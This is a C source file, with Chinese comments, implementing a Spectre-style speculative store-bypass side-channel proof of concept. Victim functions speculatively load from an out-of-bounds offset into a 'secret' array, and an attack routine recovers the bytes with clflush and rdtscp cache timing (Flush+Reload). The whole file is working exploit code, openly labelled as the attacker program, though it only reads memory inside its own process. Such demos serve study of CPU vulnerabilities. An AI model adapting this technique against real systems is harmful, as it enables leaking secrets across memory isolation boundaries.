#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
#define CACHE_HIT_THRESHOLD (90)

unsigned int array1_size = 16;
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t array2[256 * 512];
size_t str[256];
uint8_t secret[10] = {199,54,79,69,2,3,7,90,21,18};

uint8_t temp = 0;
int a=10;
int b=5;
int c=3;
int d=999;

void victim_function(size_t malicious_x)
{
	for(int i=0;i<100;i++)
	{
		int junk=secret[0];
	}
		
	str[3]=malicious_x;
	str[(d*c+b*a)/(a*b*c+a)-16]=0;
	temp &= array2[array1[str[3]] * 512];
}//victim0


void victim_function1(size_t malicious_x)
{
	for(int i=0;i<100;i++)
	{
		int junk=secret[1];
	}
		
	str[3]=malicious_x+1;
	str[(d*c+b*a)/(a*b*c+a)-16]=0;
	temp &= array2[array1[str[3]] * 512];
}//victim1

void victim_function2(size_t malicious_x)
{
	for(int i=0;i<100;i++)
	{
		int junk=secret[2];
	}
		
	str[3]=malicious_x+2;
	str[(d*c+b*a)/(a*b*c+a)-16]=0;
	temp &= array2[array1[str[3]] * 512];
}//victim2

/*
攻击者程序
*/
void attack(size_t malicious_x)
{
	printf("--------amalicious at:[%lu]--------\n",malicious_x);
	int i, j, k, mix_i, junk = 0;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (i = 0; i < 256; i++)
		_mm_clflush(&array2[i * 512]);//flush阶段
	_mm_clflush(&a);//store这几个数据
	_mm_clflush(&b);
	_mm_clflush(&c);
	_mm_clflush(&d);
	victim_function(malicious_x);//victim又会将这几个数据load回
	victim_function1(malicious_x);
	victim_function2(malicious_x);

	/**
	 * 这段是分析代码
	*/
	for (i = 0; i < 256; i++)
	{
		mix_i = ((i * 167) + 13) & 255;
		addr = &array2[mix_i * 512];
		time1 = __rdtscp((unsigned int*)&junk);
		junk = *addr;
		time2 = __rdtscp((unsigned int*)&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD)
		{
			printf("low than threshold:%d\n",mix_i);
		}
	}

}//attack

int main(int argc, const char **argv)
{
	size_t malicious_x=(size_t)(secret-array1);//secret与array1的offset
	for (int i = 0; i < sizeof(array2); ++i) 
		array2[i] = 1;//防止copy on write

	for(int i=0;i<5;i++)
		attack(malicious_x);
	return (0);
}